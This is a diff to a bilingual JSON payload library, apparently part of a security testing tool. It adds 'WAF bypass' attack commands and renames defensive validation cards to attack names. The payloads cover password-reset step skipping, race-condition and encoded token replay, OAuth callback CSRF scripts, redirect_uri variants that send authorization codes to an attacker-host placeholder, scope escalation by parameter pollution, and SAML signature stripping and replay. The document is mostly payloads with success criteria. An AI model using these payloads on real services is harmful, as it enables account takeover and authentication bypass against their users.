+                  "type": "url"
+                },
+                {
+                  "part": "-d \"account=payloader-a&new_password=PAYLOADER_MARKER\"",
+                  "explanation": {
+                    "zh": "直连设密参数",
+                    "en": "Direct set-password params"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "JSON 提交变换",
+                "en": "JSON Submission Transform"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"account\":\"payloader-a\",\"new_password\":\"PAYLOADER_MARKER\"}' http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "绕过表单层的状态字段强制检查：换 JSON 通道提交。成功判据：跳步重置成功。",
+                "en": "Bypasses form-layer state enforcement by switching to the JSON channel. Success: step-skipping reset succeeds."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "{\"account\":\"payloader-a\",\"new_password\":\"PAYLOADER_MARKER\"}",
+                  "explanation": {
+                    "zh": "JSON 直连设密",
+                    "en": "Direct JSON reset"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "step 字段伪造推进",
+                "en": "Forged Step Advancement"
+              },
+              "command": "curl -sS --max-time 5 -d \"new_password=PAYLOADER_MARKER&account=payloader-a&step=3\" http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "伪造流程步骤字段满足状态检查。成功判据：服务端按已验证状态接受重置。",
+                "en": "Forges the step field to satisfy state validation. Success: server accepts the reset as an already-verified state."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "step=3",
+                  "explanation": {
+                    "zh": "伪造步骤号",
+                    "en": "Forged step number"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "new_password=PAYLOADER_MARKER&account=payloader-a",
+                  "explanation": {
+                    "zh": "设密参数",
+                    "en": "Set-password params"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1144,7 +2835,119 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "并发竞态重放",
+                "en": "Concurrent Race Replay"
+              },
+              "command": "seq 1 5 | xargs -P5 -I{} curl -sS --max-time 5 -o /dev/null -w \"%{http_code}\\n\" -d \"token=PAYLOADER_USED_TOKEN&new_password=PAYLOADER_MARKER\" http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "绕过\"使用后失效\"检查的竞态窗口：并行请求同时通过单次消费校验。成功判据：至少两次返回成功状态码。",
+                "en": "Bypasses single-use checks via a race window with parallel requests. Success: at least two responses report success."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "seq 1 5",
+                  "explanation": {
+                    "zh": "生成五次请求",
+                    "en": "Generates five runs"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "xargs -P5 -I{}",
+                  "explanation": {
+                    "zh": "五并发执行",
+                    "en": "Runs five in parallel"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "-d \"token=PAYLOADER_USED_TOKEN&new_password=PAYLOADER_MARKER\"",
+                  "explanation": {
+                    "zh": "重放令牌参数",
+                    "en": "Replayed token params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-w \"%{http_code}\\n\"",
+                  "explanation": {
+                    "zh": "输出状态码",
+                    "en": "Prints status codes"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码令牌重放",
+                "en": "Encoded-Token Replay"
+              },
+              "command": "curl -sS --max-time 5 -d \"token=UEFZTE9BREVSX1VTRURfVE9LRU4=&new_password=PAYLOADER_MARKER\" http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "绕过已用令牌黑名单的精确匹配：base64 形态在另一解码层还原。成功判据：重置被接受。",
+                "en": "Bypasses exact-match used-token blacklists via a base64 form decoded at another layer. Success: reset accepted."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "token=UEFZTE9BREVSX1VTRURfVE9LRU4=",
+                  "explanation": {
+                    "zh": "base64 令牌形态",
+                    "en": "Base64 token form"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "new_password=PAYLOADER_MARKER",
+                  "explanation": {
+                    "zh": "marker 新口令",
+                    "en": "Marker new password"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/test/reset",
+                  "explanation": {
+                    "zh": "重置端点",
+                    "en": "Reset endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双 token 键污染",
+                "en": "Duplicate Token-Key Pollution"
+              },
+              "command": "curl -sS --max-time 5 -d \"token=PAYLOADER_USED_TOKEN&token=PAYLOADER_USED_TOKEN&new_password=PAYLOADER_MARKER\" http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "利用取参差异让消费计数与验证取不同实例。成功判据：同一令牌完成两次重置。",
+                "en": "Uses extraction divergence so the consumption counter and validator see different instances. Success: the same token resets twice."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "token=PAYLOADER_USED_TOKEN&token=PAYLOADER_USED_TOKEN",
+                  "explanation": {
+                    "zh": "重复令牌参数",
+                    "en": "Duplicated token params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "new_password=PAYLOADER_MARKER",
+                  "explanation": {
+                    "zh": "marker 新口令",
+                    "en": "Marker new password"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1287,7 +3090,127 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "自动提交表单回调",
+                "en": "Auto-Submitted Form Callback"
+              },
+              "command": "<form action=\"https://app.example.invalid/oauth/callback\" method=\"get\"><input name=\"code\" value=\"PAYLOADER_TEST_CODE\"><input name=\"state\" value=\"PAYLOADER_WRONG_STATE\"></form><script>document.forms[0].submit()</script>",
+              "description": {
+                "zh": "绕过对 <img> 标签的 CSP 限制：GET 表单脚本提交送达伪造回调。成功判据：回调端点处理了错误 state 的请求。",
+                "en": "Bypasses CSP restrictions on <img> tags by auto-submitting a GET form to the forged callback. Success: the endpoint processes the wrong-state request."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<form action=\"https://app.example.invalid/oauth/callback\" method=\"get\">",
+                  "explanation": {
+                    "zh": "GET 表单回调",
+                    "en": "GET form callback"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<input name=\"code\" value=\"PAYLOADER_TEST_CODE\">",
+                  "explanation": {
+                    "zh": "注入授权码",
+                    "en": "Injected auth code"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<input name=\"state\" value=\"PAYLOADER_WRONG_STATE\">",
+                  "explanation": {
+                    "zh": "注入错误 state",
+                    "en": "Injected wrong state"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "document.forms[0].submit()",
+                  "explanation": {
+                    "zh": "脚本提交",
+                    "en": "Script submits the form"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "no-cors fetch 送达",
+                "en": "no-cors fetch Delivery"
+              },
+              "command": "<script>fetch(\"https://app.example.invalid/oauth/callback?code=PAYLOADER_TEST_CODE&state=PAYLOADER_WRONG_STATE\",{mode:\"no-cors\"})</script>",
+              "description": {
+                "zh": "绕过跨域读取限制：no-cors 模式仍能送达请求。成功判据：服务端日志记录该回调访问。",
+                "en": "Bypasses cross-origin read restrictions since no-cors requests still reach the server. Success: callback access appears in server logs."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "fetch(",
+                  "explanation": {
+                    "zh": "fetch 发请求",
+                    "en": "Fetch sends the request"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "mode:\"no-cors\"",
+                  "explanation": {
+                    "zh": "无 CORS 模式",
+                    "en": "No-cors mode"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "state=PAYLOADER_WRONG_STATE",
+                  "explanation": {
+                    "zh": "错误 state 值",
+                    "en": "Wrong state value"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "iframe srcdoc 中转",
+                "en": "iframe srcdoc Relay"
+              },
+              "command": "<iframe srcdoc='<script>location.href=\"https://app.example.invalid/oauth/callback?code=PAYLOADER_TEST_CODE&state=PAYLOADER_WRONG_STATE\"</script>'></iframe>",
+              "description": {
+                "zh": "绕过外链脚本过滤：srcdoc 属性内的导航脚本触发回调。成功判据：回调请求携带错误 state 到达。",
+                "en": "Bypasses external-script filtering via a navigation script inside the srcdoc attribute. Success: callback arrives with the wrong state."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<iframe srcdoc=",
+                  "explanation": {
+                    "zh": "srcdoc 内联脚本",
+                    "en": "srcdoc inline script"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "location.href=",
+                  "explanation": {
+                    "zh": "iframe 导航",
+                    "en": "iframe navigation"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "state=PAYLOADER_WRONG_STATE",
+                  "explanation": {
+                    "zh": "错误 state 值",
+                    "en": "Wrong state value"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1371,7 +3294,208 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "编码遍历逃逸",
+                "en": "Encoded Traversal Escape"
+              },
+              "command": "redirect_uri=https%3A%2F%2Fclient.example.invalid%2Foauth%2Fcallback%2F..%2F..%2Fevil",
+              "description": {
+                "zh": "绕过前缀精确匹配校验：编码的遍历段在后端规范化时逃逸回调目录。成功判据：授权码被重定向到 evil 路径。",
+                "en": "Bypasses prefix matching: encoded traversal segments escape the callback directory after backend normalization. Success: code redirects to the evil path."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "redirect_uri=",
+                  "explanation": {
+                    "zh": "回调参数名",
+                    "en": "Redirect param name"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "..%2F..%2Fevil",
+                  "explanation": {
+                    "zh": "编码遍历段",
+                    "en": "Encoded traversal segments"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "尾点与大写主机",
+                "en": "Trailing Dot & Uppercase Host"
+              },
+              "command": "redirect_uri=https://CLIENT.example.invalid./callback",
+              "description": {
+                "zh": "绕过字符串全等校验：尾点与大小写在 DNS 解析上等价。成功判据：重定向仍指向合法域但绕过比对。",
+                "en": "Bypasses exact-string validation since a trailing dot and mixed case resolve identically in DNS. Success: redirect still lands on the real domain while evading comparison."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "redirect_uri=",
+                  "explanation": {
+                    "zh": "回调参数名",
+                    "en": "Redirect param name"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "CLIENT.example.invalid.",
+                  "explanation": {
+                    "zh": "大写加尾点",
+                    "en": "Uppercase with trailing dot"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "userinfo 前缀欺骗",
+                "en": "Userinfo Prefix Spoof"
+              },
+              "command": "redirect_uri=https://client.example.invalid@{ATTACKER_HOST}/callback",
+              "description": {
+                "zh": "绕过前缀白名单匹配：@ 前的 userinfo 使实际主机为攻击者域。成功判据：授权码发往 {ATTACKER_HOST}。",
+                "en": "Bypasses allowlist prefix matching: the userinfo before @ makes the real host the attacker's. Success: the code is sent to {ATTACKER_HOST}."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "client.example.invalid@{ATTACKER_HOST}",
+                  "explanation": {
+                    "zh": "userinfo 混淆",
+                    "en": "Userinfo confusion"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{ATTACKER_HOST}",
+                  "explanation": {
+                    "zh": "攻击者主机占位",
+                    "en": "Attacker host placeholder"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双斜杠与编码组合",
+                "en": "Double Slash & Encoding Combo"
+              },
+              "command": "redirect_uri=https:////{ATTACKER_HOST}/callback\nredirect_uri=https%3A%2F%2F%2F%2F{ATTACKER_HOST}%2Fcallback",
+              "description": {
+                "zh": "绕过按标准单斜杠匹配的白名单：解析器容错接受多斜杠。成功判据：授权码发往攻击者域。",
+                "en": "Bypasses single-slash allowlist matching since tolerant parsers accept extra slashes. Success: the code is issued to the attacker host."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "redirect_uri=https:////{ATTACKER_HOST}/callback",
+                  "explanation": {
+                    "zh": "多斜杠回调",
+                    "en": "Multi-slash callback"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "https:////",
+                  "explanation": {
+                    "zh": "四斜杠方案头",
+                    "en": "Quadruple-slash scheme"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码片段后缀",
+                "en": "Encoded Fragment Suffix"
+              },
+              "command": "redirect_uri=https://{ATTACKER_HOST}/callback%23\nredirect_uri=https://{ATTACKER_HOST}/callback%3F",
+              "description": {
+                "zh": "编码 #/? 尾缀在规范化层剥离，白名单比对与实际跳转分离。成功判据：比对通过且跳转到攻击者域。",
+                "en": "Encoded #/? suffixes strip at normalization, splitting allowlist comparison from the actual redirect. Success: comparison passes and the redirect hits the attacker host."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "redirect_uri=https://{ATTACKER_HOST}/callback%23",
+                  "explanation": {
+                    "zh": "编码井号尾缀",
+                    "en": "Encoded hash suffix"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "redirect_uri=https://{ATTACKER_HOST}/callback%3F",
+                  "explanation": {
+                    "zh": "编码问号尾缀",
+                    "en": "Encoded question suffix"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "redirect_uri 操纵",
+                "en": "Validation step 1 for OAuth redirect_uri Exact-Match Testing"
+              },
+              "command": "https://{ATTACKER_HOST}/callback\nhttps://{ATTACKER_HOST}/callback#\nhttps://{ATTACKER_HOST}/callback?\nhttps://{ATTACKER_HOST}/callback?code=\nhttps://{ATTACKER_HOST}/callback%00\nhttps://{ATTACKER_HOST}/callback%0a\nhttps://{ATTACKER_HOST}/callback%0d\nhttps://{ATTACKER_HOST}/callback%09\nhttps://{ATTACKER_HOST}/callback%20\nhttps://{ATTACKER_HOST}/callback%23\nhttps://{ATTACKER_HOST}/callback%2523\nhttps://{ATTACKER_HOST}/callback;/\nhttps://{ATTACKER_HOST}/callback/..\nhttps://{ATTACKER_HOST}/callback/../../\nhttps://{ATTACKER_HOST}/callback/../\nhttps://{ATTACKER_HOST}/callback#@\nhttps://{ATTACKER_HOST}/callback?.json\nhttps://{ATTACKER_HOST}/callback/.json\nhttps://{TARGET}/callback\nhttps://{TARGET}/callback/\nhttps://{TARGET}.{ATTACKER_HOST}/callback\nhttps://{TARGET}@{ATTACKER_HOST}/callback\nhttps://{ATTACKER_HOST}/callback/redirect_uri=https://{TARGET}/callback\nhttps:%2f%2f{ATTACKER_HOST}%2fcallback\n/\\{ATTACKER_HOST}/callback\nhttps://{TARGET}/redirect?url=https://{ATTACKER_HOST}/callback\nhttps://{TARGET}/redirect?next=https://{ATTACKER_HOST}/callback\nhttps://{TARGET}/redirect?return=https://{ATTACKER_HOST}/callback\nhttps://{TARGET}/redirect?go=https://{ATTACKER_HOST}/callback\nhttps://{TARGET}/../{ATTACKER_HOST}/callback\nhttps://{TARGET}/..%2f..%2f{ATTACKER_HOST}/callback\nhttps://callback.{TARGET}.{ATTACKER_HOST}\nhttps://{TARGET}/callback/../{ATTACKER_HOST}",
+              "description": {
+                "zh": "把 redirect_uri 变体逐条提交授权端点；任一未注册变体仍签发 code，即确认重定向绑定不严格。",
+                "en": "Submit each redirect_uri variant to the authorization endpoint; any unregistered variant still issuing a code confirms loose redirect binding."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "https://{ATTACKER_HOST}/callback",
+                  "explanation": {
+                    "zh": "外部域回调基线",
+                    "en": "External callback baseline"
+                  },
+                  "type": "url"
+                },
+                {
+                  "part": "https://{ATTACKER_HOST}/callback%00",
+                  "explanation": {
+                    "zh": "NUL 尾缀回调",
+                    "en": "NUL-suffixed callback"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "https://{TARGET}@{ATTACKER_HOST}/callback",
+                  "explanation": {
+                    "zh": "userinfo 混淆回调",
+                    "en": "Userinfo confusion callback"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "https://{TARGET}/redirect?url=https://{ATTACKER_HOST}/callback",
+                  "explanation": {
+                    "zh": "开放重定向链",
+                    "en": "Open redirect chain"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "callback/../../",
+                  "explanation": {
+                    "zh": "回调路径遍历",
+                    "en": "Callback path traversal"
+                  },
+                  "type": "value"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1392,10 +3516,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "redirect_uri=https://client.example.invalid/oauth/callback\nredirect_uri=https://client.example.invalid/oauth/callback/extra\nredirect_uri=https://client.example.invalid/oauth/callback?next=https%3A%2F%2Funregistered.example.invalid%2Fmarker\nredirect_uri=https://unregistered.example.invalid/oauth/callback\nredirect_uri=https://client.example.invalid:8443/oauth/callback\nredirect_uri=https://client.example.invalid/redirect?url=https%3A%2F%2Funregistered.example.invalid%2Fmarker\n# Expected: exact registered URI is accepted; every other owned, non-resolving control is rejected before issuing a code."
             },
             {
               "title": {
@@ -1422,12 +3543,12 @@
         {
           "id": "auth-oauth-scope-audience",
           "name": {
-            "zh": "OAuth Scope 与 Audience 边界",
-            "en": "OAuth Scope and Audience Boundary"
+            "zh": "OAuth Scope 越权与 Audience 混淆",
+            "en": "OAuth Scope Escalation & Audience Confusion"
           },
           "description": {
-            "zh": "请求超范围 scope 或跨资源 audience 的令牌，验证签发与资源侧校验是否收紧。",
-            "en": "Isolates commands from the mixed source into a OAuth Scope and Audience Boundary validation card using synthetic principals, a read-only marker, and server-side evidence."
+            "zh": "对照正常请求与越权 scope/audience 请求，验证授权端点与资源服务器的范围与受众校验。",
+            "en": "Contrast normal requests with escalated scope/audience requests to verify scope and audience validation at the authorize endpoint and resource server."
           },
           "subCategory": {
             "zh": "OAuth Scope 与 Audience 边界",
@@ -1455,7 +3576,103 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "编码空格合并",
+                "en": "Encoded Space Merge"
+              },
+              "command": "scope=read%20admin",
+              "description": {
+                "zh": "绕过 scope 白名单逐项比对：编码分隔符使前后端解析出不同集合。成功判据：授权结果包含 admin。",
+                "en": "Bypasses per-item scope whitelisting: the encoded separator yields different parsed sets across layers. Success: grant includes admin."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "scope=",
+                  "explanation": {
+                    "zh": "scope 参数名",
+                    "en": "Scope param name"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "read%20admin",
+                  "explanation": {
+                    "zh": "编码空格分隔",
+                    "en": "Encoded space separator"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "scope 参数污染",
+                "en": "Scope Parameter Pollution"
+              },
+              "command": "scope=read&scope=admin",
+              "description": {
+                "zh": "利用取参差异注入附加授权。成功判据：下发的令牌含 admin 权限。",
+                "en": "Injects extra grants via parameter-pollution extraction differences. Success: issued token carries admin."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "scope=read&scope=admin",
+                  "explanation": {
+                    "zh": "重复 scope 参数",
+                    "en": "Duplicated scope params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "admin",
+                  "explanation": {
+                    "zh": "越权 scope",
+                    "en": "Privileged scope"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "audience 别名参数探测",
+                "en": "Audience Alias Probing"
+              },
+              "command": "audience=https://api.example.invalid&resource=https://api.example.invalid&aud=api",
+              "description": {
+                "zh": "绕过单一参数名的受众校验假设：探测后端实际读取的字段。成功判据：任一别名字段被接受并跨受众使用令牌。",
+                "en": "Bypasses single-parameter audience assumptions by probing which alias the backend actually reads. Success: any alias is accepted and the token works cross-audience."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "audience=https://api.example.invalid",
+                  "explanation": {
+                    "zh": "audience 参数",
+                    "en": "Audience param"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "resource=",
+                  "explanation": {
+                    "zh": "resource 别名",
+                    "en": "Resource alias"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "aud=api",
+                  "explanation": {
+                    "zh": "aud 别名",
+                    "en": "Audience alias"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1551,8 +3768,8 @@
         {
           "id": "auth-saml-signature-validation",
           "name": {
-            "zh": "SAML 签名验证边界",
-            "en": "SAML Signature Validation Boundary"
+            "zh": "SAML 签名绕过",
+            "en": "SAML Signature Bypass"
           },
           "description": {
             "zh": "修改断言属性后重放响应，验证 SP 是否校验实际使用的断言签名而非仅响应签名。",
@@ -1598,7 +3815,119 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "无签名断言重放",
+                "en": "Unsigned Assertion Replay"
+              },
+              "command": "xmlstarlet ed -d \"//*[local-name()='Signature']\" fixtures/saml-signed.xml > saml-nosig.xml && curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" --data-urlencode \"RelayState=/marker\" http://127.0.0.1:8080/saml/acs < <(base64 -w0 saml-nosig.xml)",
+              "description": {
+                "zh": "绕过验签强制缺失：删除 Signature 节点后重放。成功判据：ACS 接受无签名断言并建立会话。",
+                "en": "Bypasses missing signature enforcement by replaying the assertion with Signature nodes removed. Success: the ACS accepts it and establishes a session."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "xmlstarlet ed -d \"//*[local-name()='Signature']\"",
+                  "explanation": {
+                    "zh": "删除签名节点",
+                    "en": "Deletes Signature nodes"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "--data-urlencode \"SAMLResponse@-\"",
+                  "explanation": {
+                    "zh": "表单编码断言",
+                    "en": "Form-encodes the assertion"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "--data-urlencode \"RelayState=/marker\"",
+                  "explanation": {
+                    "zh": "附带 RelayState",
+                    "en": "Adds RelayState"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "< <(base64 -w0 saml-nosig.xml)",
+                  "explanation": {
+                    "zh": "base64 后送入",
+                    "en": "Pipes base64 via stdin"
+                  },
+                  "type": "control"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "信任锚切换",
+                "en": "Trust Anchor Swap"
+              },
+              "command": "xmlsec1 --verify --trusted-pem fixtures/attacker-ca.crt --id-attr:ID Assertion fixtures/saml-signed.xml",
+              "description": {
+                "zh": "检测验证方是否固定指定信任锚：用攻击者 CA 验证同一文档。成功判据：验证通过说明信任锚可被替换。",
+                "en": "Checks whether the verifier pins its trust anchor by validating the same document against an attacker CA. Success: verification passes, proving the anchor is swappable."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "xmlsec1 --verify",
+                  "explanation": {
+                    "zh": "执行验签",
+                    "en": "Runs verification"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "--trusted-pem fixtures/attacker-ca.crt",
+                  "explanation": {
+                    "zh": "攻击者信任锚",
+                    "en": "Attacker trust anchor"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "签名覆盖范围混淆",
+                "en": "Signature Coverage Confusion"
+              },
+              "command": "xmlstarlet ed -s \"//*[local-name()='Conditions']\" -t elem -n lab -v \"PAYLOADER_UNSIGNED\" fixtures/saml-signed.xml | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs < <(base64 -w0 /dev/stdin)",
+              "description": {
+                "zh": "在已签名断言内追加未签名节点，检验签名是否覆盖整个断言。成功判据：新增节点被接受且断言有效。",
+                "en": "Appends unsigned nodes inside a signed assertion to test whether the signature covers the whole assertion. Success: the new node is accepted and the assertion remains valid."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "xmlstarlet ed -s \"//*[local-name()='Conditions']\"",
+                  "explanation": {
+                    "zh": "追加节点",
+                    "en": "Appends a node"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "-n lab -v \"PAYLOADER_UNSIGNED\"",
+                  "explanation": {
+                    "zh": "节点名与取值",
+                    "en": "Node name and value"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "< <(base64 -w0 /dev/stdin)",
+                  "explanation": {
+                    "zh": "管道编码提交",
+                    "en": "Encodes stdin and posts"
+                  },
+                  "type": "control"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1681,7 +4010,111 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "RelayState 变换重放",
+                "en": "RelayState-Mutated Replay"
+              },
+              "command": "curl -sS --max-time 5 --data-urlencode \"SAMLResponse=PAYLOADER_PREVIOUSLY_CONSUMED\" --data-urlencode \"RelayState=/marker2\" http://127.0.0.1:8080/saml/acs",
+              "description": {
+                "zh": "绕过按完整请求体哈希的重放缓存：仅变换 RelayState 制造新缓存键。成功判据：ACS 仍接受断言。",
+                "en": "Bypasses whole-body-hash replay caches by mutating only RelayState to mint a fresh cache key. Success: the ACS still accepts the assertion."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "RelayState=/marker2",
+                  "explanation": {
+                    "zh": "变换 RelayState",
+                    "en": "Altered RelayState"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/saml/acs",
+                  "explanation": {
+                    "zh": "ACS 端点",
+                    "en": "ACS endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Deflate 编码变体",
+                "en": "Deflate-Encoding Variant"
+              },
+              "command": "printf \"%s\" \"$(gzip -c fixtures/replayed.xml | base64 -w0)\" | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs",
+              "description": {
+                "zh": "利用支持 GZip/Deflate 的实现差异改变编码层绕过重放比对。成功判据：压缩形态断言被接受。",
+                "en": "Exploits implementations that accept GZip/Deflate encodings to alter the comparison layer. Success: the compressed assertion is accepted."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "gzip -c fixtures/replayed.xml",
+                  "explanation": {
+                    "zh": "GZip 压缩断言",
+                    "en": "Gzips the assertion"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "base64 -w0",
+                  "explanation": {
+                    "zh": "base64 编码",
+                    "en": "Base64 encodes"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "--data-urlencode \"SAMLResponse@-\"",
+                  "explanation": {
+                    "zh": "表单编码提交",
+                    "en": "Posts form-encoded"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "依赖方切换重放",
+                "en": "Relying-Party Switch Replay"
+              },
+              "command": "xmlstarlet ed -N saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" -u \"//saml:Audience\" -v \"https://sp2.example.invalid/metadata\" fixtures/replayed.xml | curl -sS --max-time 5 --data-urlencode \"SAMLResponse@-\" http://127.0.0.1:8080/saml/acs < <(base64 -w0 /dev/stdin)",
+              "description": {
+                "zh": "改写 Audience 到另一 SP 后重放同一断言，绕过按 SP 维度的重放记录。成功判据：sp2 侧认证成功。",
+                "en": "Rewrites the Audience to another SP and replays the same assertion to bypass per-SP replay records. Success: authentication succeeds on the sp2 side."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-u \"//saml:Audience\"",
+                  "explanation": {
+                    "zh": "改写 Audience",
+                    "en": "Updates Audience"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "-v \"https://sp2.example.invalid/metadata\"",
+                  "explanation": {
+                    "zh": "另一 SP 地址",
+                    "en": "Second SP metadata"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "< <(base64 -w0 /dev/stdin)",
+                  "explanation": {
+                    "zh": "管道编码提交",
+                    "en": "Encodes stdin and posts"
+                  },
+                  "type": "control"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1732,8 +4165,8 @@
         {
           "id": "auth-saml-xsw",
           "name": {
-            "zh": "SAML XML 签名包装验证基线",
-            "en": "SAML XML Signature Wrapping Validation Baseline"
+            "zh": "SAML 签名包装攻击",
+            "en": "SAML XSW"
           },
           "description": {
             "zh": "构造 XML 签名包装变体（移动签名引用对象），验证签名校验是否可被结构欺骗。",
@@ -1764,7 +4197,209 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "前插恶意断言",
+                "en": "Evil Assertion Prepend"
+              },
